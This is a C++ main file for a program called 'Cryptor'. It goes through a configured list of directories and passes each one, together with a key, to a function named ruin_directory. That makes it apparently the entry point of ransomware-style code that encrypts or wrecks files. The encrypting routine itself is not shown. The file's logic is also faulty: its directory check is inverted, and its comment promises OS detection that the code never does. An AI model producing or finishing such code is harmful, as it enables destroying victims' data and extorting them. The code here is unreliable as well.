//
//  main.cpp
//  Cryptor
//
//  Created by Gleb Bair on 10/23/25.
//

#include <iostream>
#include "headers/cryptor.h"
#include "headers/config.h"
#include "headers/banners.h"

int main(int argc, const char * argv[]) {
    /* 
    * Try and identify the operating system the user is running. If the
    * the user runs windows, the file path separator is '\'. Linux and
    * macOS uses '/'
    *
    * 1.) Iterate through list of directories (after definition)
    * 2.) Are those directories valid?
    * 3.) RUin directories
    */
    for (const std::string& dir : directories) {
        cryptor::fs::path dir_path(dir);

        if (!cryptor::fs::exists(dir) || cryptor::fs::is_directory(dir)) {
            banners::print_error({"Invalid directory...", dir}); return 1;
        }

        cryptor::ruin_directory(dir, key);
    }
}
